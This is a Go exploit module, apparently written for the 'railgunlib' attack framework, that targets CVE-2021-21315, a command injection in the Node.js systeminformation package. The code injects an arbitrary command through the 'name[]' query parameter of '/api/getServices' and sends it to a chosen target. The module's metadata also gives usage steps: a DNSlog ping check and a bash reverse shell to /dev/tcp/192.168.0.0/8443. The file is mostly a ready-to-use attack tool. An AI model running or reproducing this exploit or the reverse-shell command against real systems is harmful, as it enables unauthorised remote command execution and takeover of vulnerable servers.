package exp_nodejs

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"net/url"
	"strings"
	"time"
)

type Exp_CVE_2021_21315 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_21315) Cmd1(cmd string) (expResult exp_model.ExpResult) {

	headers := self.GetInitExpHeaders() //获取header
	//headers.Set("Content-Type", "application/json") //设置格式
	//设置poc
	payload := `/api/getServices?name[]=$(cmd)`
	//替换poc
	payload = strings.Replace(payload, "cmd", url.PathEscape(cmd), 1)
	//设置超时
	self.Params.Timeout = time.Second * 100
	//发送请求
	httpResp := self.HttpGet(self.AppendUri(self.Params.Target, payload), headers)
	if httpResp.Err != nil {
		expResult.Err = httpResp.Err
		self.EchoInfoMsg("执行失败，请检查命令执行结果！")
		return
	}
	self.EchoInfoMsg("执行成功，请检查命令执行结果！")
	return expResult

}

func init() {
	expmsg := exp_model.ExpMsg{
		Author:    "凉风",
		Time:      "2022-05-22",
		Range:     "systeminformation < 5.3.1",
		ID:        "CVE-2021-21315",
		Describe:  "Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。",
		Details:   "1, 使用dnslog判断\nping -c 1 xxx.dnslog.cn \n2,反弹shell \nbash -i >& /dev/tcp/192.168.0.0/8443 0>&1",
		Payload:   "/api/getServices?name[]=$(cmd)",
		VulType:   common.VulCmdExec,
		Reference: "http://wiki.cisp-pte.com/#/wiki",
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: expmsg,
	}
	exp_register.ExpStructRegister(&Exp_CVE_2021_21315{}, registerMsg)

}
